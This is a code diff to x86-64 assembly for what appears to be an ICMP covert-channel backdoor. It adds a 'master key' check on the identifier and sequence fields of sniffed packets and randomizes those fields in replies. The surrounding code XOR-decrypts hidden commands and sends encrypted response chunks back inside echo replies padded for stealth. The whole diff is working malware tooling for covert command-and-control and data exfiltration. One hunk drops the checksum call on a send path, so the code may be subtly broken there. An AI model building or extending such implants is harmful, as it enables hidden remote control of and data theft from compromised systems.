@@ -21,8 +21,8 @@ section .data
         type db 0               ; ICMP Type 0 (Echo Reply)
         code db 0               
         checksum dw 0           ; Checksum placeholder
-        identifier dw 0x1234    ; Packet Identifier
-        sequence db 0xBE, 0xEF  ; Magic Sequence for filtering
+        identifier dw 0    ; Packet Identifier
+        sequence dw 0  ; Magic Sequence for filtering
         ; --- MIMICRY PADDING (24 BYTES) ---
         mimicry_ts dq 0         ; 8-byte Dynamic Timestamp (RDTSC)
         mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
@@ -99,12 +99,25 @@ _sniff:
     cmp rax, 52                 
     jb _sniff                   
 
-    ; Verify Magic Sequence (0xDEAD)
-    mov cx, word [sniffed_data + 26] 
-    cmp cx, 0xADDE                   
-    jne _sniff                       
+    push rax
+    push rdx
+; --- MAGIC SEQUENCE VERIFICATION (MASTER KEY) ---
+    movzx eax, word [sniffed_data + 26] ; Extract Sequence
+    xchg al, ah                         ; Endianness correction
+    movzx edx, word [sniffed_data + 24] ; Extract Identifier
+    xchg dl, dh                         ; Endianness correction
+    
+    add eax, edx                        ; EAX = SEQ + ID
+    cmp eax, 120                        ; Verify Master's key total (120)
+    
+    pop rdx                             ; Restore saved RDX
+    pop rax                             ; Restore saved RAX (Packet size)
+    
+    jne _sniff                          ; Ignore packet if validation fails                    
+
 
     ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
+
     mov r14, rax
     sub r14, 52                     ; Strip IP, ICMP Header and Mimicry Padding
     lea rsi, [sniffed_data + 52]    ; Start reading from offset 52 (Secret data)
@@ -283,6 +296,7 @@ _chunk_loop:
     ; Update dynamic timestamp for stealth
     rdtsc                           
     mov [icmp_packet + 8], rax      
+    call _create_seq_id
 
     lea rsi, [full_response + r15]
     lea rdi, [icmp_packet + 32]     ; Copy actual encrypted chunk
@@ -290,7 +304,9 @@ _chunk_loop:
     rep movsb                       
 
 .packet_send:
-    call _checksum_cal              
+    
+    call _checksum_cal
+
     mov rax, 44                     ; sys_sendto
     mov rdi, [fd_no]                
     lea rsi, [icmp_packet]          
@@ -343,7 +359,7 @@ _chunk_loop:
     rdtsc
     mov [icmp_packet + 8], rax
 
-    call _checksum_cal
+    call _create_seq_id
     mov rax, 44
     mov rdi, [fd_no]
     lea rsi, [icmp_packet]
@@ -402,6 +418,27 @@ _xor_cipher:
 .done:
     ret
 
+_create_seq_id:
+    ; 1. Generate a random number (1-119) for the Identifier
+    rdtsc
+    xor edx, edx    ; Clear EDX before division
+    mov ecx, 119
+    div ecx         ; EDX now contains the remainder (0-118)
+    inc edx         ; EDX is now a random number between 1 and 119 (ID)
+
+    ; 2. Calculate the Sequence number for Asymmetric Return
+    mov eax, 150    ; Load the asymmetric return key (150) into EAX
+    sub eax, edx    ; EAX = 150 - EDX (This becomes the SEQ value)
+
+    ; 3. Network Byte Order (Endianness) Correction
+    xchg dl, dh     ; Swap lower 16 bits of EDX (DX)
+    xchg al, ah     ; Swap lower 16 bits of EAX (AX)
+
+    ; 4. Inject into the ICMP packet structure
+    mov word [icmp_packet + 4], dx
+    mov word [icmp_packet + 6], ax
+
+    ret             ; Return to caller
 _exit:
     mov rax, 60                     ; sys_exit
     mov rdi, 0                      
